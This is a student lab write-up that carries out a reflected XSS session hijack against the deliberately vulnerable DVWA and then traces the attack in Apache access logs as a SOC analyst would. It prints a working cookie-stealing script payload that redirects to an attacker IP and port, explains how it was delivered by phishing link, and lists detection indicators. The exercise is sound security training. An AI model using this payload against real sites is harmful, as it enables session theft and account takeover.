# Reflected XSS: Exploiting DVWA and Investigating the Attack in Apache Logs

**Domain:** Threat and Vulnerability Management / Security Operations
**Tools used:** DVWA (Damn Vulnerable Web Application), Kali Linux, Firefox, Python 3 (`http.server`), Apache2 access logs, `grep`, `tail`
**Type:** Hands-on lab (WGU D483 Security Operations)

## Scenario

This lab had two halves: first playing attacker against a deliberately vulnerable web app (DVWA) to actually carry out a reflected XSS session-hijack, then switching hats to play SOC analyst and find the evidence of that same attack sitting in the Apache access log. The idea was to connect the dots between "what an attack looks like when you run it" and "what it looks like six months later when you're the one digging through logs trying to prove it happened."

## Approach

**Phase 1 — Exploiting the vulnerability (attacker POV)**

1. Logged into DVWA at low security and opened the Reflected XSS module. Before trying anything malicious, I first submitted a normal value (`testuser`) into the input field to see how the app behaved on a clean input — it echoed `Hello testuser` back, confirming the value was being reflected into the page.
2. Tested for script execution by submitting `<script>alert("You have been hacked!")</script>` in place of a name. The alert fired, confirming the input field was reflecting raw, unescaped user input back into the HTML — a textbook reflected XSS vulnerability.
3. Escalated the proof-of-concept to `<script>alert(document.cookie)</script>` to confirm that JavaScript running in that context could reach the page's cookies, including the session cookie (`PHPSESSID`). This is the step that turns "the site has an XSS bug" into "this bug can be used to steal sessions."
4. Repeated the same probing sequence a second time, but this time navigating back to the base XSS page between each submission rather than staying on the result page. I did this deliberately to see how it would affect the HTTP referrer chain that shows up in logs — relevant for the investigation half of the lab.
5. Set up a simple local listener (`python -m http.server 9999` on the Kali box) to act as the attacker-controlled collection point for stolen cookies.
6. Built a malicious, URL-encoded link that would redirect a victim's browser to `attacker_ip:9999` with `document.cookie` appended as a query parameter, then embedded it behind an innocuous-looking hyperlink in a simulated phishing email ("activate your free premium trial").
7. Played the victim role, clicked the link from the simulated email, and confirmed the browser tab went blank — consistent with what a real victim would see (no visible payload execution, just silent redirection/exfiltration).
8. Switched back to the attacker terminal and confirmed the listener had received a GET request carrying the victim's session cookie.

**Phase 2 — Investigating the attack after the fact (analyst POV)**

1. Started from the reported symptom: a user said they clicked a link in an odd email, got a blank page, and were then locked out of their account. That's consistent with session hijacking, so I went looking for XSS indicators in `/var/log/apache2/access.log`.
2. Rather than guessing at log entries, I started from the actual phishing link and decoded the percent-encoding by hand (`%3c` = `<`, `%3a` = `:`, `%2f` = `/`, etc.) to get a human-readable version of what the victim's browser was actually told to do — a `<script>` redirect to an external IP on port 9999 carrying `document.cookie`.
3. Searched the log for the destination IP:port, but had to search using the percent-encoded form (`10.1.16.66%3a9999`) rather than the plain-text form, since that's how it's actually stored in Apache's log — an easy miss if you assume logs store decoded values.
4. Found the matching log line and confirmed it was in Combined Log Format (9 fields: client IP, identity, user, timestamp, request, status code, size, referrer, user agent).
5. Checked the HTTP response code on that request and confirmed it was a 2xx (successful), meaning the redirect and cookie exfiltration actually completed server-side rather than failing partway.
6. Worked backward through the log with `tail` to reconstruct the attacker's full sequence: a normal-looking username submission, a return to the base page, a `<script>alert(...)` probe, another return to the base page, and finally the `document.cookie` probe — the same pattern I had generated in Phase 1, now visible purely from log data.
7. Cross-checked the HTTP referrer field on each entry. Even though the attacker returned to the "home" page between each attack step (specifically to avoid leaving an obvious referrer chain), the referrer values still tied each probing request back to the page that immediately preceded it — meaning the attempt to obscure the attack sequence didn't actually work.

## Findings

| Evidence | Detail |
|---|---|
| Malicious redirect | `<script>window.location='http://[attacker-ip]:9999/?cookie='+document.cookie</script>` reflected via the `name` parameter |
| Log encoding | Attack payload stored percent-encoded in `access.log` even when submitted in cleartext through the browser form |
| HTTP status | 2xx — cookie exfiltration request completed successfully |
| Log format | Combined Log Format (includes referrer + user agent, not just the 7 base fields) |
| Primary IoC | `<script>` tags appearing as raw input value in a GET request — the single clearest signal of XSS probing in the log |
| Secondary IoC | Referrer chain linking sequential probing requests together, even when the attacker tried to break the chain by returning to a neutral page between steps |
| Impact confirmed | Victim's `PHPSESSID` (session cookie) was captured by the attacker's listener, consistent with the reported account lockout — attacker likely used the hijacked session to change account credentials |

## What I'd do differently / lessons learned

- Decoding percent-encoded values by hand works fine for a single log line, but at real SOC volume I'd want this automated — a script or SIEM parsing rule that decodes and flags `<script>`, `javascript:`, `onerror=`, etc. in URL parameters would catch this class of attack far faster than manual `grep`.
- I initially tried searching the log for the plain-text IP:port before realizing I needed the percent-encoded form. That's a good reminder to always check the raw log format assumptions early rather than assuming values are stored the way they were typed into a browser.
- The referrer chain was the most useful piece of evidence here for reconstructing attacker intent (probe → probe → exfil), not just confirming that XSS happened. In a real investigation I'd prioritize pulling referrer chains early rather than treating each log line in isolation.
- A real detection rule based on this lab wouldn't be "look for the word xss" — it'd be a regex/signature on `<script>`, encoded angle brackets, and known exfil patterns like `document.cookie` in request parameters, since a real attacker's URL paths won't announce themselves the way DVWA's `/xss_r/` does.

## Why this matters for the job

This is exactly the kind of ticket a SOC analyst gets: "user says they got a weird email and now can't log in." Being able to go from that vague report to a decoded malicious URL, a specific log line, and a reconstructed attack timeline — using nothing but `grep`, `tail`, and a percent-encoding reference table — is a core triage skill, not just an XSS-specific one.
